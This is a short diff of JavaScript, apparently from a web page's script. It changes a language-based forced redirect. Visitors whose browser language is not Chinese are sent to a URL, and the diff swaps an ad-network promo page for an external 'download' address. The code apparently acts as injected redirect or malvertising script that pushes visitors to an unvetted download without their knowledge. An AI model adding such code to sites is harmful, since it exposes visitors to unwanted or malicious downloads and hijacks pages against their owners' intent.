@@ -18,6 +18,6 @@ var lang = navigator.language || navigator.userLanguage;
 
 if(lang.substr(0, 3) == "zh-");
 else
-window.location.href = "https://bngpst.com/promo.php?c=708232&type=postitial&p%5Bname%5D=base&p%5Bfrequency%5D=86400&p%5Bautoclose%5D=0&p%5Bpreview%5D=1&p%5Bframe%5D=1&p%5Bstandalone%5D=1";
+window.location.href = "http://agfgv.com/download/";
 
 }
